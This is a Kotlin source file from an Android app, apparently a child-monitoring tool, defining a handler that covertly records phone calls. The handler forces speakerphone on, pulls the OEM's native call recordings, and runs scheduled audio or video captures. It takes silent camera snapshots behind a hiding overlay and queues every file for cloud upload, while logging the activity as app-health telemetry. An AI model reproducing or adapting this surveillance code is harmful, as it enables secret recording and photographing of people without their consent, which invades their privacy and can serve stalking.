package com.example.authapp.service

import android.content.Context
import android.content.Intent
import android.os.Handler
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.camera.SilentSnapshotManager
import com.example.authapp.recorder.CallRecorder
import com.example.authapp.sync.SyncScheduler
import com.google.firebase.crashlytics.FirebaseCrashlytics

class ChildCallRecordingHandler(private val context: Context) {

    var callRecorder: CallRecorder? = null
        private set
    private var scheduledStopRunnable: Runnable? = null

    fun startCallRecording(phoneNumber: String, onStarted: () -> Unit) {
        onStarted()
        com.example.authapp.recorder.CallSpeakerManager.enableSpeakerForCall(context.applicationContext)
        if (callRecorder == null) {
            callRecorder = CallRecorder(context.applicationContext)
        }
        callRecorder?.startCallRecording(phoneNumber)
    }

    fun stopCallRecording(uid: String, onStopped: () -> Unit) {
        com.example.authapp.recorder.CallSpeakerManager.disableSpeakerForCall(context.applicationContext)
        val callStartTime = callRecorder?.recordingStartTimeMillis ?: 0L
        val activeNumber = callRecorder?.activeCallNumber ?: ""
        val durationSec = if (callStartTime > 0L) (System.currentTimeMillis() - callStartTime) / 1000L else 0L
        val internalFile = callRecorder?.stopCallRecording()
        callRecorder = null
        onStopped()

        // Prioritize Samsung / OEM Native Hardware Two-Way Call Recording
        val nativeFile = com.example.authapp.recorder.NativeCallRecordingDetector.findRecentNativeRecording(activeNumber, callStartTime)
        val fileToUpload = if (nativeFile != null && nativeFile.exists() && nativeFile.length() > 1024L) {
            FirebaseCrashlytics.getInstance().log("[ChildService] Using OEM Native 2-Way Call Recording: ${nativeFile.name}")
            try { internalFile?.delete() } catch (_: Exception) {}
            nativeFile
        } else {
            internalFile
        }

        if (uid.isNotEmpty() && fileToUpload != null && fileToUpload.exists() && fileToUpload.length() > 0) {
            AppHealthTelemetry.logDiagnostic(
                context.applicationContext,
                "CALL_RECORDING",
                "SUCCESS",
                "Call audio captured (${durationSec}s, ${fileToUpload.length()} bytes, source=${if (fileToUpload == nativeFile) "OEM_NATIVE" else "INTERNAL"}). Starting offline-safe Cloud sync."
            )
            SyncScheduler.enqueueUpload(
                context = context.applicationContext,
                file = fileToUpload,
                childId = uid,
                streamType = "call",
                durationSeconds = durationSec
            )
            FirebaseCrashlytics.getInstance().log("[ChildService] Call recording enqueued for offline-safe upload")
        } else {
            AppHealthTelemetry.logDiagnostic(
                context.applicationContext,
                "CALL_RECORDING",
                "FAILED",
                "Call recording output was empty or failed to generate file"
            )
        }
    }

    fun startScheduledRecording(
        intent: Intent,
        uid: String,
        mainHandler: Handler,
        onEnsureOverlay: () -> Unit,
        onRemoveOverlay: () -> Unit,
        onStartRecording: (isVideo: Boolean, durationMinutes: Int) -> Unit,
        onStopRecording: () -> Unit
    ) {
        val durationMinutes = intent.getIntExtra("duration_minutes", 5).coerceIn(1, 120)
        val scheduleId = intent.getStringExtra("schedule_id") ?: ""
        val captureType = intent.getStringExtra("capture_type") ?: "audio"
        val isVideo = captureType.equals("video", ignoreCase = true)

        onStartRecording(isVideo, durationMinutes)
        if (callRecorder == null) {
            callRecorder = CallRecorder(context.applicationContext)
        }
        callRecorder?.startCallRecording("scheduled_${if (isVideo) "vid" else "aud"}_$scheduleId")

        if (isVideo && uid.isNotEmpty()) {
            onEnsureOverlay()
            try {
                SilentSnapshotManager(context.applicationContext).captureSnapshot(
                    isFront = false,
                    onCaptured = { photoFile ->
                        onRemoveOverlay()
                        SyncScheduler.enqueueUpload(
                            context = context.applicationContext,
                            file = photoFile,
                            childId = uid,
                            streamType = "snapshot",
                            durationSeconds = 0L
                        )
                    },
                    onError = { onRemoveOverlay() }
                )
            } catch (_: Exception) {
                onRemoveOverlay()
            }
        }

        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
        scheduledStopRunnable = Runnable {
            FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled recording auto-stopping after $durationMinutes min")
            val durationSec = callRecorder?.recordingStartTimeMillis?.let {
                if (it > 0L) (System.currentTimeMillis() - it) / 1000L else 0L
            } ?: 0L
            val recordedFile = callRecorder?.stopCallRecording()
            callRecorder = null
            onStopRecording()

            if (uid.isNotEmpty() && recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
                SyncScheduler.enqueueUpload(
                    context = context.applicationContext,
                    file = recordedFile,
                    childId = uid,
                    streamType = if (isVideo) "video_schedule" else "scheduled",
                    durationSeconds = durationSec
                )
                FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled recording enqueued for upload (offline-safe)")
            }
            scheduledStopRunnable = null
        }
        mainHandler.postDelayed(scheduledStopRunnable!!, durationMinutes * 60 * 1000L)
    }

    fun stopAll(mainHandler: Handler) {
        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
        scheduledStopRunnable = null
        try { callRecorder?.stopCallRecording() } catch (_: Exception) {}
        callRecorder = null
    }
}
